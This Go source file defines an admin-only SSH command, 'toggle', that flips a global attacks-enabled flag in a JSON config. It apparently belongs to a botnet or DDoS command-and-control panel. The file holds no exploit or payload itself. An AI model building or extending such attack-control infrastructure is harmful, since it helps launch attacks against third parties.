package cmds

import (
	"arismcnc/database"
	"arismcnc/utils"
	"fmt"
	"io"

	"github.com/gliderlabs/ssh"
)

// ToggleCommand allows admins to toggle global attack settings
type ToggleCommand struct{}

func (c *ToggleCommand) Name() string {
	return "toggle"
}

func (c *ToggleCommand) Execute(session ssh.Session, db *database.Database, args []string, output io.Writer) {
	fmt.Fprintf(output, "Select what you want to Toggle (attacks): ")
	operation, err := utils.ReadLine(session)
	if err != nil {
		fmt.Fprintln(output, "Error reading input:", err)
		return
	}

	switch operation {
	case "attacks":
		config, err := utils.LoadConfig("assets/config.json")
		if err != nil {
			fmt.Fprintln(output, "Error loading config:", err)
			return
		}

		err = config.ToggleAttacks()
		if err != nil {
			fmt.Fprintln(output, "Failed to toggle attacks:", err)
			return
		}

		status := "enabled"
		if !config.Attacks_enabled {
			status = "disabled"
		}
		fmt.Fprintf(output, "Successfully toggled attacks. Now attacks are %s.\n", status)

	default:
		fmt.Fprintln(output, "Invalid option. Available options: attacks.")
	}
}

func (c *ToggleCommand) AdminOnly() bool {
	return true
}

func (c *ToggleCommand) Aliases() []string {
	return []string{"manage", "enable"}
}

func init() {
	CommandMap["toggle"] = &ToggleCommand{}
}
